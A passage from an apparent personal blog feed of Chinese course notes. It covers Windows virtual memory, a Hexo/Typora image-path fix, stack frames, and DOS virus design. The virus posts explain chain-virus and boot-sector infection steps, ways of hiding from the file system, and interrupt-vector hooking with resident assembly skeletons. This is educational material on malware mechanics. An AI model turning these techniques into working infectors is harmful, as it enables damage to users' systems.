Interface（图形设备接口），包含用于画图和显示文本的函数，比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li><li>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API最终都是调用ntdll.dll中的函数实现的</li></ol></blockquote><h2 id="windows内存管理和程序加载"><a class="markdownIt-Anchor" href="#windows内存管理和程序加载"></a> Windows内存管理和程序加载</h2><h3 id="保护模式内存管理"><a class="markdownIt-Anchor" href="#保护模式内存管理"></a> 保护模式内存管理</h3><ol><li>DOS的内存管理是实模式，我们可以随意改动甚至系统的内存（比如修改中断向量表）</li><li>Windows是工作在x86的保护模式。每个进程都有自己独立的线性地址空间（0-4GB，32位CPU的寻址能力是2^32=4GB），互不干扰，这4GB空间会按某个固定大小（如4KB）分成N个页</li><li>同时，内存又分为用户空间和内核空间，用户空间代码无法直接访问内核空间</li><li>其能防止应用程序非法访问其他应用程序的地址空间（任务间保护），防止应用程序非法访问操作系统地址空间（系统保护）</li></ol><h3 id="一个小实验"><a class="markdownIt-Anchor" href="#一个小实验"></a> 一个小实验</h3><p>在cmd中编译以下代码，编译命令<code>gcc a.c -o b.exe</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> gi;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input s to set gi or d to dispaly gi\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argCount, <span class="keyword">char</span> ** args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argCount != <span class="number">2</span>)  &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span>)  &#123;</span><br><span class="line">        gi = <span class="number">12</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">        getchar();    <span class="comment">//进程持续挂起</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> usage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行，会发现两个进程的值不同，但地址空间却相同！</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200247086.png" alt="image-20210512200247086" /></p><p>这说明，我们看到的是“虚假”的内存地址</p><h3 id="原因分析"><a class="markdownIt-Anchor" href="#原因分析"></a> 原因分析</h3><p>在Windows系统下，处于保护模式，我们看见的内存地址是<strong>逻辑地址</strong>，并非真正的<strong>物理地址</strong></p><p>在DOS系统下，处于实模式，我们看见的内存地址就是真实的物理地址</p><p>同一逻辑地址的值对应不同物理上内存地址正是保护模式的能力</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200650502.png" alt="image-20210512200650502" /></p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200751672.png" alt="image-20210512200751672" /></p><h3 id="转换过程"><a class="markdownIt-Anchor" href="#转换过程"></a> 转换过程</h3><p>32位虚拟地址分成3部分</p><ol><li>CR3寄存器给出页目录地址</li><li>前面10位用于在页目录中查找页表地址</li><li>中间10位用于在页表中查找页表项</li><li>后面12位给出相对页表项地址的偏移</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512201221862.png" alt="image-20210512201221862" /></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ollydebug简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ollydebug简介&quot;&gt;&lt;/a&gt; OllyDebug简介&lt;/h2&gt;
&lt;p&gt;Windows下用户级调试神器——OllyDebug，简称OD&lt;/p&gt;
&lt;p&gt;OD是强大的动态追踪工具，具有可视化操作界面，但是非常占内存&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>hexo与typora的图片路径问题</title>
    <link href="https://wsw8.online/archives/d1451cce.html"/>
    <id>https://wsw8.online/archives/d1451cce.html</id>
    <published>2021-05-12T06:53:00.000Z</published>
    <updated>2021-05-12T07:31:34.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a class="markdownIt-Anchor" href="#问题描述"></a> 问题描述</h2><p>不知道新搭建博客的你是否遇到这个问题，用typora写文章时难免要添加一些图片，而正好typora会默认在当前目录<code>hexo/source/_post</code>里创建一个后缀名为<code>.asset</code>的文件夹来存放图片，乍一看，挺好，typora里正常显示，而一推到hexo博客图片就因为路径原因看不了了</p><span id="more"></span><h2 id="问题分析"><a class="markdownIt-Anchor" href="#问题分析"></a> 问题分析</h2><p>路径原因，在typora里默认当前文件存储位置<code>hexo/source/_post</code>为起始目录，而hexo默认source文件夹<code>hexo/source</code>为起始目录，这也就导致了在typora里无论你写相对路径还是绝对路径推到hexo时都是找不到的</p><h2 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法"></a> 解决方法</h2><p>查了很多方法，网上也有人总结了几大解决方案，觉得不怎么好用，综合之下我决定这样更改</p><ol><li><p>为每篇文章设定其根目录</p><blockquote><p>typora里是可以自己设定根目录的，在每篇文章的开头中加入</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br></pre></td></tr></table></figure><p>这样typora里的起始目录就和hexo里一致了</p></blockquote></li><li><p>已经写好的文章只能手动添加了，即将写的文章每次都手动加难免累，我们可以更改hexo里的模板<code>hexo/scaffolds/post.md</code>，这是你使用<code>hexo n 文章名</code>命令时生成的模板</p><blockquote><p>post.md的开头内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> &#123;&#123; <span class="string">title</span> &#125;&#125;</span><br><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br><span class="line"><span class="attr">date:</span> &#123;&#123; <span class="string">date</span> &#125;&#125;</span><br></pre></td></tr></table></figure><p>这样新生成的文章都会以<code>hexo/source</code>为根目录</p></blockquote></li><li><p>更改typora的设置</p><blockquote><p>打开typora的<code>偏好设置</code>，选中<code>图像</code>，更改其设置</p><ol><li><p>选择<code>复制到指定路径</code></p></li><li><p>路径里填你博客的绝对路径，例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\Blog\source\images\$&#123;filename&#125;</span><br></pre></td></tr></table></figure><p>注意后面加${filename}就会以你文章名在images下新建一个图片文件夹，看起来井井有条一些</p></li><li><p>下面的设置一定要勾选<code>优先使用相对路径</code>，这样会防止你贴个图片结果贴成了绝对路径导致hexo不认识</p></li><li><p>参考配置如下图</p><p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152029191.png" alt="image-20210512152029191" /></p></li></ol></blockquote></li><li><p>搞定，看看效果</p><p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152225354.png" alt="image-20210512152225354" /></p></li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>解决的思想就是让hexo与typora都能认识写的这个路径，也就是说写成<code>/images/文件夹名/图片名</code>这种形式（没办法，hexo默认的就是以<code>hexo/source</code>为根的），所以要对typora进行一些相对复杂的配置让typora也能认识这个路径，于是，我们更改了typora文章的url根目录，并优先使用相对路径。ok，搞定！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#问题描述&quot;&gt;&lt;/a&gt; 问题描述&lt;/h2&gt;
&lt;p&gt;不知道新搭建博客的你是否遇到这个问题，用typora写文章时难免要添加一些图片，而正好typora会默认在当前目录&lt;code&gt;hexo/source/_post&lt;/code&gt;里创建一个后缀名为&lt;code&gt;.asset&lt;/code&gt;的文件夹来存放图片，乍一看，挺好，typora里正常显示，而一推到hexo博客图片就因为路径原因看不了了&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="https://wsw8.online/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="自学" scheme="https://wsw8.online/tags/%E8%87%AA%E5%AD%A6/"/>
    
    <category term="博客" scheme="https://wsw8.online/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="博客搭建" scheme="https://wsw8.online/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_链式病毒</title>
    <link href="https://wsw8.online/archives/b1495143.html"/>
    <id>https://wsw8.online/archives/b1495143.html</id>
    <published>2021-05-12T01:50:21.000Z</published>
    <updated>2021-05-12T08:04:28.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>之前的病毒在每份感染文件中都复制了一份病毒拷贝，而链式病毒只保留一份病毒拷贝，其利用文件目录项，将受感染文件的头簇指向病毒</p><span id="more"></span><h2 id="复习"><a class="markdownIt-Anchor" href="#复习"></a> 复习</h2><p>回顾一下文件的查找过程</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512095523949.png" alt="image-20210512095523949" /></p><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><p>感染过程：</p><ol><li>如首次感染，将病毒保存在某个空闲扇区</li><li>将被感染文件（com文件）首簇存目录项保留段</li><li>修改首簇指向病毒的首簇</li></ol><p>执行过程：</p><ol><li>执行被感染文件则启动病毒，加载的是病毒的首簇，并执行</li><li>病毒获取当前执行程序的名字，获取对应目录项。从其中保留字段获取原文件首簇号，并遍历FAT簇链加载它们</li><li>跳到原文件加载的内存中执行</li></ol><h2 id="病毒设计"><a class="markdownIt-Anchor" href="#病毒设计"></a> 病毒设计</h2><h3 id="感染部分"><a class="markdownIt-Anchor" href="#感染部分"></a> 感染部分</h3><ol><li>被感染文件的真实起始扇区号写到<strong>目录表项的保留区</strong>（目录项的保留区从目录项头第13个字节即偏移0ch开始，共10字节）</li><li>修改被感染文件的目录项的起始扇区字段指向病毒文件的首簇</li><li>目录项中的文件大小字段也要修改成病毒的真实大小，这样才能保证病毒能被完整加载</li><li>将原来病毒文件的目录项全部32字节改为0，这样从外部看就不存在这个病毒文件，也没有对应的目录项了</li></ol><h3 id="执行部分"><a class="markdownIt-Anchor" href="#执行部分"></a> 执行部分</h3><ol><li>先获取被感染程序的名字</li><li>然后从根目录寻找被感染程序的目录项</li><li>找到后从该文件目录项的保留区获取被感染程序的首簇号</li><li>找到被感染程序所在簇（即扇区），加载该扇区到内存</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512144855424.png" alt="image-20210512144855424" /></p><h2 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h2><h3 id="获取执行文件名"><a class="markdownIt-Anchor" href="#获取执行文件名"></a> 获取执行文件名</h3><ol><li>从com文件的ds：2c处获得环境块首址的段地址</li><li>环境块就在段地址：0000处</li><li>环境块内容PATH=……COMSPEC=C:\<a href="http://COMMAND.COM">COMMAND.COM</a>\0…0 0 xxxx</li><li>环境块开始是PATH等0字符结尾的串，最后是两个00字符。然后有两个字节可能是数目，之后就是执行程序的名字</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#介绍&quot;&gt;&lt;/a&gt; 介绍&lt;/h2&gt;
&lt;p&gt;之前的病毒在每份感染文件中都复制了一份病毒拷贝，而链式病毒只保留一份病毒拷贝，其利用文件目录项，将受感染文件的头簇指向病毒&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_引导与中断</title>
    <link href="https://wsw8.online/archives/11d03106.html"/>
    <id>https://wsw8.online/archives/11d03106.html</id>
    <published>2021-05-12T00:43:47.000Z</published>
    <updated>2021-05-12T01:45:58.926Z</updated>
    
    <content type="html"><![CDATA[<h2 id="面向文件系统的病毒引导型病毒"><a class="markdownIt-Anchor" href="#面向文件系统的病毒引导型病毒"></a> 面向文件系统的病毒——引导型病毒</h2><h3 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h3><p>将病毒放在软盘的引导扇区，并将原来的引导代码放到数据区，在执行完病毒代码后拷贝回原来的引导代码，并将执行权交给引导代码</p><span id="more"></span><h3 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h3><ol><li>自我覆盖的问题，所以需要我们将病毒中执行拷贝指令的代码移出被覆盖区域</li><li>如何使别的数据不使用簇2的问题，这里我们可以修改FAT1和FAT2表，将簇2改为不可用，如果改为已占用的FFF，由于没有对应目录项会很可疑，所以改为坏簇FF7</li></ol><h3 id="磁盘访问int-13h中断"><a class="markdownIt-Anchor" href="#磁盘访问int-13h中断"></a> 磁盘访问int 13h中断</h3><p>复位磁盘系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xor ah, ah;ah&#x3D;0为磁盘复位</span><br><span class="line">int 13h;13h为磁盘中断</span><br></pre></td></tr></table></figure><p>读指定从磁头，道，扇区起始，n个扇区道内存缓冲</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">AH &#x3D; 02h是读扇区功能号</span><br><span class="line">AL &#x3D; 将读入多少个扇区</span><br><span class="line">CL &#x3D; 起始扇区号</span><br><span class="line">CH &#x3D; 磁道</span><br><span class="line">DH &#x3D; 磁头</span><br><span class="line">DL &#x3D; 磁盘，0代表a盘</span><br><span class="line">ES:BX &#x3D; 读缓冲的地址，一般只填写BX</span><br><span class="line"></span><br><span class="line">Mov ah, 02</span><br><span class="line">Mov al, 5;读5个扇区</span><br><span class="line">Mov cl, 1;从1扇区开始</span><br><span class="line">Mov ch, 0;读0道</span><br><span class="line">Mov dh，0;读0头</span><br><span class="line">Mov dl, 0;读a盘</span><br><span class="line">Mov bx,7c00h;读到7c00h处</span><br><span class="line">int 13h</span><br></pre></td></tr></table></figure><p>设计一个基于0开始的绝对扇区读函数</p><p>功能：将绝对扇区号转化为磁头，道，扇区的CHS寻址方式</p><p>如何转化？</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090322696.png" alt="image-20210512090322696" /></p><p>具体实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ReadSector:;该函数的绝对扇区号是从0开始的</span><br><span class="line">;函数参数：ax开始绝对扇区号, cl读扇区数, bx读缓冲地址</span><br><span class="line">mov bp, sp</span><br><span class="line">sub sp, 2</span><br><span class="line">push bx             ;保持读缓冲地址</span><br><span class="line">mov byte [bp - 2], cl;保持读扇区数</span><br><span class="line">mov bl, 18;除数18</span><br><span class="line">div bl           ;被除数ax是绝对扇区号，除以18，余数在ah中，商在al中</span><br><span class="line">inc ah     ;余数加1为道内扇区号</span><br><span class="line">mov cl, ah    ;int 13h中断参数设置cl&#x3D;道内扇区号</span><br><span class="line">mov dh, al    ;dh &#x3D; N</span><br><span class="line">and dh, 1      ;N&amp;1为磁头，int 13h中断参数设置dh&#x3D;磁头号  </span><br><span class="line">shr al, 1     ;N 右移1位，al &#x3D; 磁道号</span><br><span class="line">mov ch, al    ;ch&#x3D;磁道号，int 13h中断参数设置ch&#x3D;道号</span><br><span class="line">mov dl, 0    ;int 13参数设置，dl&#x3D;0，读软盘</span><br><span class="line">pop bx      ;获得读缓冲地址，设置int 13h参数，bx&#x3D;读缓冲地址</span><br><span class="line">mov ah, 02h           ;int 13h参数设置，读扇区功能号</span><br><span class="line">mov al, [bp - 2]      ;获得读扇区数，int 13h参数设置，al&#x3D;读取扇区数</span><br><span class="line">int 13h</span><br><span class="line">add sp, 2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="执行部分程序设计"><a class="markdownIt-Anchor" href="#执行部分程序设计"></a> 执行部分程序设计</h3><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090455764.png" alt="image-20210512090455764" /></p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>关于软盘引导型病毒，下列说法不正确的是（       ）<br />A. 病毒感染时会将原引导扇区内容拷贝到软盘的数据区<br />B. 病毒执行时会将原引导扇区内容从软盘的数据区拷贝到内存7C00处<br />C. 病毒将原引导扇区的内容拷贝到7C00时需要处理自我覆盖的问题<br />D. 病毒感染时必须覆盖原引导扇区的全部内容才能获得执行</li></ol><p>参考答案：D</p><ol start="2"><li>已知软盘上一个扇区的绝对扇区数是X，软盘1道有18个扇区，请问如何获得该扇区的CHS参数？</li></ol><p>参考答案：<img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512091137459.png" alt="image-20210512091137459" /></p><h2 id="病毒的执行机制中断替换"><a class="markdownIt-Anchor" href="#病毒的执行机制中断替换"></a> 病毒的执行机制——中断替换</h2><h3 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h3><ol><li>认识中断向量表</li><li>非驻留式的中断向量修改</li><li>驻留式的中断向量修改</li></ol><h3 id="中断向量表"><a class="markdownIt-Anchor" href="#中断向量表"></a> 中断向量表</h3><p>触发中断后，就会去调用中断处理程序</p><p>而找到中断处理程序的入口地址就是通过中断向量表</p><p>中断向量表在内存00：00处，每4个字节为一个项，这个项的索引就是中断向量号，其中高2个字节为段地址，低2个字节为段内偏移</p><p>中断触发指令<code>int xxh</code>，xx就是中断向量号，4*xx就是中断xx的入口地址在中断向量表中的存放位置</p><h3 id="非驻留式中断向量修改"><a class="markdownIt-Anchor" href="#非驻留式中断向量修改"></a> 非驻留式中断向量修改</h3><p>驻留程序：一直在内存中不退出的程序，例如中断处理程序</p><p>我们目的是修改中断处理程序下的入口地址（即修改中断向量表）使其执行病毒程序，但是病毒程序也需要驻留在内存才不会使中断向量表无效</p><p>在非驻留式中断替换中我们在病毒程序调用后恢复中断向量表</p><h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512092456791.png" alt="image-20210512092456791" /></p><h4 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h4><p>病毒和中断向量表不在同一个段，因此段寄存器需要根据实际访问情况变化</p><p>跨段跳转的问题：</p><blockquote><p>病毒需要由自己段跳到原中断向量程序所在的段<br />要跨段跳转，就要采用JMP XX:YY的形式<br />但是JMP CX:AX的语法是不支持的<br />即JMP XX:YY的指令不支持两个间接性，XXYY总有一个是立即数，而程序里面Seg和Offset都不是立即数，怎么解决？<br />我们可以先采用两个立即数来确定JMP指令的形式（比如JMP 00:00），然后我们再来定位到JMP指令的机器码，进行按字节的细粒度修改！</p></blockquote><h4 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512093103505.png" alt="image-20210512093103505" /></p><h3 id="驻留式中断向量更改"><a class="markdownIt-Anchor" href="#驻留式中断向量更改"></a> 驻留式中断向量更改</h3><p>DOS系统自己就提供了中断调用修改中断向量表，因此这里把hook变成内存驻留</p><p>获取中断入口地址的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,16h;al 中断向量号，16h为键盘IO中断号</span><br><span class="line">mov ah,35h;功能号，取中断向量地址</span><br><span class="line">int 21h;es:bx为中断程序入口地址</span><br></pre></td></tr></table></figure><p>设定中断向量的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx, offset;ds:dx指出了新的中断入口地址</span><br><span class="line">mov al,16h;这个指出了要设定的中断号</span><br><span class="line">mov ah,25h;功能号，设置中断向量</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>病毒代码程序设计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org0100h</span><br><span class="line">jmp initialize</span><br><span class="line">Hook 驻留代码</span><br><span class="line">----------------</span><br><span class="line">initialize:</span><br><span class="line">;改变原中断的中断向量表项指向Hook</span><br><span class="line">;修改Hook最后一条JMP语句的机器码指向原中断向量程序地址</span><br><span class="line"></span><br><span class="line">mov dx, initialize    ;dx以前内容内存驻留</span><br><span class="line">int 27h    ;返回DOS，结束进程，但不释放驻留内存</span><br></pre></td></tr></table></figure><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><ol><li>关于DOS中断和中断型病毒，下列说法不正确的是（       ）<br />A. DOS中断程序的入口地址存放在中断向量表中<br />B. 病毒在修改中断向量表时需要考虑不同段地址的问题<br />C. 10h中断程序的入口段地址存放在 4*10h+2的地方<br />D. 中断型病毒是通过替换原中断处理程序获得执行机会</li></ol><p>参考答案：D</p><p>解析：并不是替换了原中断处理程序，而是修改了中断向量表使其先执行的病毒程序再执行中断处理程序</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;面向文件系统的病毒引导型病毒&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#面向文件系统的病毒引导型病毒&quot;&gt;&lt;/a&gt; 面向文件系统的病毒——引导型病毒&lt;/h2&gt;
&lt;h3 id=&quot;大致思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#大致思路&quot;&gt;&lt;/a&gt; 大致思路&lt;/h3&gt;
&lt;p&gt;将病毒放在软盘的引导扇区，并将原来的引导代码放到数据区，在执行完病毒代码后拷贝回原来的引导代码，并将执行权交给引导代码&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_函数调用</title>
    <link href="https://wsw8.online/archives/9c64c22b.html"/>
    <id>https://wsw8.online/archives/9c64c22b.html</id>
    <published>2021-05-10T07:31:00.000Z</published>
    <updated>2021-05-11T13:48:35.923Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h2><p>定义：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等</p><p>特性：先进后出（FILO）</p><p>基本操作：</p><ol><li>PUSH：压栈</li><li>POP：弹栈</li></ol><span id="more"></span><h2 id="函数调用对栈的操作"><a class="markdownIt-Anchor" href="#函数调用对栈的操作"></a> 函数调用对栈的操作</h2><ol><li>把指令寄存器EIP（指向当前CPU将要运行的下一条指令的地址）入栈，作为程序的返回地址（一般用RET）表示</li><li>把基址寄存器EBP入栈（保护数据）</li><li>把EBP设为栈顶指针ESP，作为新的基地址</li><li>动态存储分配留出一定空间，即把ESP减去一个适当的值</li></ol><h3 id="获取参数值"><a class="markdownIt-Anchor" href="#获取参数值"></a> 获取参数值</h3><p>call指令执行完毕的栈布局：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511195956130.png" alt="image-20210511195956130" /></p><p>为了得到参数2，我们使用EBP保存ESP，而为了保护保存ESP的EBP，我们将其入栈，得到如此结构：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200219660.png" alt="image-20210511200219660" /></p><h3 id="获取局部变量值"><a class="markdownIt-Anchor" href="#获取局部变量值"></a> 获取局部变量值</h3><p>栈分布如图：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200418376.png" alt="image-20210511200418376" /></p><h3 id="获取返回值"><a class="markdownIt-Anchor" href="#获取返回值"></a> 获取返回值</h3><p>函数返回值通过eax寄存器传递，如果两个返回值还会使用edx：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200752137.png" alt="image-20210511200752137" /></p><p>如果返回值太大、就需要主调函数在call被调函数之前创建临时空间：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201041931.png" alt="image-20210511201041931" /></p><p>然后，在被调函数传递返回值时：</p><ol><li>通过[EBP+偏移]获得返回值的存放地址</li><li>把返回值写入到这个内存</li><li>把返回值写入到EAX，<code>mov eax,[ebp+偏移]</code></li></ol><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201411512.png" alt="image-20210511201411512" /></p><h2 id="函数调用的扫尾工作"><a class="markdownIt-Anchor" href="#函数调用的扫尾工作"></a> 